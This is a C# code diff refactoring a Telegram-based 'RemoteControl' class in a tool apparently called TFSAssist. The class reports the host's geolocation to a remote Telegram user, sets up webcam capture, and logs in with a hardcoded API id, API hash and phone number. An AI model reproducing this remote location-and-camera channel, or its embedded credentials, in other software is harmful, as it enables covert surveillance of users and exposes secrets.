@@ -10,7 +10,6 @@ using System.Net;
 using System.Reflection;
 using System.Text;
 using System.Threading.Tasks;
-using System.Windows.Forms;
 using TeleSharp.TL;
 using TFSAssist.Control;
 using Utils;
@@ -21,91 +20,59 @@ using Utils.UIControls.Tools;
 
 namespace TFSAssist
 {
-    class TTLControl : TLControl
+    public class RemoteControl : IDisposable
     {
-        public TTLControl(int appiId, string apiHash) : base(appiId, apiHash)
+        class TTLControl : TLControl
         {
+            public TTLControl(int appiId, string apiHash) : base(appiId, apiHash)
+            {
 
+            }
         }
-    }
 
-    public class TFSA_TLControl : IDisposable
-    {
         private readonly string ClientID;
         private TTLControl _control;
 
         private CamCapture _camCapture;
 
-        private readonly GeoCoordinateWatcher _watcher;
+        private GeoCoordinateWatcher _watcher;
         private string _locationResult = string.Empty;
         private bool _tryGetLocation = false;
 
         private readonly Action _checkUpdates;
         private readonly Func<string> _getLogs;
-        private readonly Action<WarnSeverity, string> _writeLog;
+        private readonly Action<WarnSeverity, string> _writeLogs;
 
         public string TempDirectory { get; }
         public bool IsEnabled { get; private set; } = false;
 
-        public TFSA_TLControl(string clientId, Action checkUpdates, Func<string> getLogs, Action<WarnSeverity, string> log)
+        public RemoteControl(string clientId, Action checkUpdates, Func<string> getLogs, Action<WarnSeverity, string> writeLogs)
         {
             _checkUpdates = checkUpdates;
             _getLogs = getLogs;
-            _writeLog = log;
+            _writeLogs = writeLogs;
             ClientID = clientId;
             TempDirectory = Path.Combine(ASSEMBLY.ApplicationDirectory, "Temp");
-
-            try
-            {
-                _watcher = new GeoCoordinateWatcher();
-                _watcher.StatusChanged += _watcher_StatusChanged;
-                _watcher.Start();
-            }
-            catch (Exception)
-            {
-                // ignored
-            }
-        }
-
-        private async void _watcher_StatusChanged(object sender, GeoPositionStatusChangedEventArgs e)
-        {
-            if (e.Status == GeoPositionStatus.Ready)
-            {
-                if (!_watcher.Position.Location.IsUnknown)
-                {
-                    GeoCoordinate coordinate = _watcher.Position.Location;
-                    _locationResult = $"Latitude=[{coordinate.Latitude.ToString().Replace(",",".")}] Longitude=[{coordinate.Longitude.ToString().Replace(",", ".")}]";
-                    if (_tryGetLocation)
-                    {
-                        await SendMessageToCurrentUser(_locationResult);
-                        _tryGetLocation = false;
-                    }
-                }
-            }
         }
 
         public async Task<bool> Initialize()
         {
-            IsEnabled = false;
+            InitGeoWatcher();
+            InitCamCapture();
+            await InitTempSession();
+            await InitTempDirectory();
+            await Connect(GetAuthUserCode);
+            return IsEnabled;
+        }
 
-            await GetTempSession();
-            await CreateTempDirectory();
-
+        async Task Connect(Func<Task<string>> getAuthUserCode)
+        {
             try
             {
+                IsEnabled = false;
                 _control = new TTLControl(770122, "8bf0b952100c9b22fd92499fc329c27e");
                 await _control.ConnectAsync();
                 IsEnabled = true;
-
-                try
-                {
-                    // сделаем отдельную проверку на создании CamCapture, т.к. все зависит от IIS если она поддерживает ту платформу на которой была сбилдена прога, то будет работать, иначе нет. Но все остальное должно проинититься, в случае чего можно будет сделать исправление посмотрев логи
-                    _camCapture = new CamCapture();
-                }
-                catch (Exception ex)
-                {
-                    WriteExLog(ex, false);
-                }
 
                 await Task.Delay(5000);
 
@@ -113,12 +80,28 @@ namespace TFSAssist
 
                 await Task.Delay(1000);
             }
+            catch (AuthorizeException ex)
+            {
+                if (getAuthUserCode != null)
+                {
+                    try
+                    {
+                        await _control.AuthUserAsync(getAuthUserCode, "+375333866536");
+                        await Connect(null);
+                    }
+                    catch (Exception ex2)
+                    {
+                        WriteExLog(ex2, false);
+                    }
+                    return;
+                }
+
+                WriteExLog(ex, false);
+            }
             catch (Exception ex)
             {
                 WriteExLog(ex, false);
             }
-
-            return IsEnabled;
         }
 
         //public async Task EndTransaction()
@@ -372,7 +355,7 @@ namespace TFSAssist
         }
 
 
-        Dictionary<string, string> ReadOptionParams(string options)
+        static Dictionary<string, string> ReadOptionParams(string options)
         {
             Dictionary<string, string> optParams = new Dictionary<string, string>(StringComparer.CurrentCultureIgnoreCase);
             StringBuilder builderParam = new StringBuilder();
@@ -429,7 +412,7 @@ namespace TFSAssist
             return optParams;
         }
 
-        async Task SaveFile(string destination, string data)
+        static async Task SaveFile(string destination, string data)
         {
             using (var stream = new FileStream(destination, FileMode.OpenOrCreate))
             {
@@ -473,14 +456,91 @@ namespace TFSAssist
             }
         }
 
-        async Task GetTempSession()
+
+        void InitGeoWatcher()
         {
             try
             {
-                if (!File.Exists(TLControl.SessionName))
+                _watcher = new GeoCoordinateWatcher();
+                _watcher.StatusChanged += Watcher_StatusChanged;
+                _watcher.Start();
+            }
+            catch (Exception ex)
+            {
+                WriteExLog(ex, false);
+            }
+        }
+
+        private async void Watcher_StatusChanged(object sender, GeoPositionStatusChangedEventArgs e)
+        {
+            if (e.Status != GeoPositionStatus.Ready)
+                return;
+
+            if (_watcher.Position.Location.IsUnknown)
+                return;
+
+            GeoCoordinate coordinate = _watcher.Position.Location;
+            _locationResult = $"Latitude=[{coordinate.Latitude.ToString().Replace(",", ".")}] Longitude=[{coordinate.Longitude.ToString().Replace(",", ".")}]";
+
+            if (_tryGetLocation)
+            {
+                await SendMessageToCurrentUser(_locationResult);
+                _tryGetLocation = false;
+            }
+        }
+
+        void InitCamCapture()
+        {
+            try
+            {
+                // сделаем отдельную проверку на создании CamCapture, т.к. все зависит от IIS если она поддерживает ту платформу на которой была сбилдена прога, то будет работать, иначе нет. Но все остальное должно проинититься, в случае чего можно будет сделать исправление посмотрев логи
+                _camCapture = new CamCapture();
+            }
+            catch (Exception ex)
+            {
+                WriteExLog(ex, false);
+            }
+        }
+
+        async Task<string> GetAuthUserCode()
+        {
+            string result = string.Empty;
+            WriteExLog("Started searching code.");
+            string fileAuthCode = TLControl.SessionName + ".code";
+
+            try
+            {
+                while (!File.Exists(fileAuthCode))
+                {
+                    await Task.Delay(5000);
+                }
+
+                using (var stream = new StreamReader(fileAuthCode))
+                {
+                    string res = await stream.ReadToEndAsync();
+                    result = Utils.Crypto.AES.DecryptStringAES(res, nameof(TLControl));
+                }
+
+                File.Delete(fileAuthCode);
+            }
+            catch (Exception)
+            {
+                // null
+            }
+
+            return result;
+        }
+
+        async Task InitTempSession()
+        {
+            try
+            {
+                string tempSession = TLControl.SessionName + ".tmp";
+
+                if (!File.Exists(tempSession))
                     return;
 
-                using (var stream = new FileStream(TLControl.SessionName, FileMode.Open))
+                using (var stream = new FileStream(tempSession, FileMode.Open))
                 {
                     var buffer = new byte[2048];
                     await stream.ReadAsync(buffer, 0, 2048);
@@ -490,7 +550,7 @@ namespace TFSAssist
                     }
                 }
 
-                File.Delete(TLControl.SessionName);
+                File.Delete(tempSession);
             }
             catch (Exception ex)
             {
@@ -498,7 +558,7 @@ namespace TFSAssist
             }
         }
 
-        async Task CreateTempDirectory()
+        async Task InitTempDirectory()
         {
             if (Directory.Exists(TempDirectory))
             {
@@ -530,8 +590,12 @@ namespace TFSAssist
 
         void WriteExLog(Exception ex, bool isDebug = true)
         {
+            WriteExLog(ex.ToString(), isDebug);
+        }
+        void WriteExLog(string message, bool isDebug = true)
+        {
             //_writeLog?.Invoke(isDebug ? WarnSeverity.Debug : WarnSeverity.Error, $"{nameof(TFSA_TLControl)}=[{ex.Message}]\r\n{ex.StackTrace}");
-            _writeLog?.Invoke(isDebug ? WarnSeverity.Debug : WarnSeverity.Error, $"{nameof(TFSA_TLControl)}=[{ex.ToString()}]");
+            _writeLogs?.Invoke(isDebug ? WarnSeverity.Debug : WarnSeverity.Error, $"{nameof(RemoteControl)}=[{message}]");
         }
 
         public void Dispose()
